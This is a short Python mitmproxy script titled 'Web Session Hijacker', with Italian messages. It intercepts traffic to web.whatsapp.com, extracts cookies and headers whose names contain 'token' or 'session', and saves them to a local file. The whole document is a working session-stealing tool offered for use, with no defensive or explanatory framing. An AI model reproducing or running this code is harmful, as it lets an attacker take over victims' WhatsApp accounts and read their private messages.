"""
Web Session Hijacker
Creato da: Jashin L.
"""

from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    try:
        if "web.whatsapp.com" in flow.request.host:
            cookies = flow.request.cookies
            headers = flow.response.headers
            with open("session_data.txt", 'a') as f:
                for cookie in cookies:
                    if "token" in cookie or "session" in cookie:
                        f.write(f"Cookie trovato: {cookie} = {cookies[cookie]}\n")
                        print(f"Cookie trovato: {cookie} = {cookies[cookie]}")
                
                for header in headers:
                    if "token" in header or "session" in header:
                        f.write(f"Header trovato: {header} = {headers[header]}\n")
                        print(f"Header trovato: {header} = {headers[header]}")
    except Exception as e:
        print(f"Errore durante l'analisi del traffico: {e}")